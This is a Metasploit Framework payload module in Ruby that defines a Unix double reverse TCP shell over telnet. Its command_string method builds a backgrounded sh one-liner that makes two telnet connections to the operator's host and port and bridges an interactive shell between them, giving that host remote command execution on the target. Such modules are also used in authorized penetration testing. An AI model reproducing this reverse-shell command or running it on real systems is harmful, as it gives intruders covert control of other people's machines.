##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp_double'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::ReverseTcpDouble'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Double reverse TCP (telnet)',
      'Description'   => 'Creates an interactive shell through two inbound connections',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'UNIX',
      'Arch'          => ARCH_CMD,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'telnet',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd =
      "sh -c '(sleep #{3600+rand(1024)}|" +
      "telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
      "while : ; do sh && break; done 2>&1|" +
      "telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
      " >/dev/null 2>&1 &)'"
    return cmd
  end

end
